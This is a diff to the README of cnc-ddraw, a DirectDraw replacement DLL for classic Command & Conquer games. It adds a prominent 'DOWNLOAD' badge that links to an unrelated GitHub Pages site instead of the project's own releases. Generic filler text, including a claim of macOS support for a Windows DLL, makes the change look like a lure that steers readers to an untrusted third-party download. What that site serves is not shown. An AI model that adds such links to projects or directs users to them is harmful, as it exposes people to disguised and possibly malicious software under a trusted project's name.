@@ -30,6 +30,12 @@ cnc-ddraw is a DirectDraw replacement DLL for Command & Conquer, Red Alert, and 
 
 Whether you're a newcomer or a veteran, cnc-ddraw provides the tools you need to get the most out of your gaming tools experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download cnc-ddraw](https://img.shields.io/badge/⬇_DOWNLOAD_cnc+ddraw-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
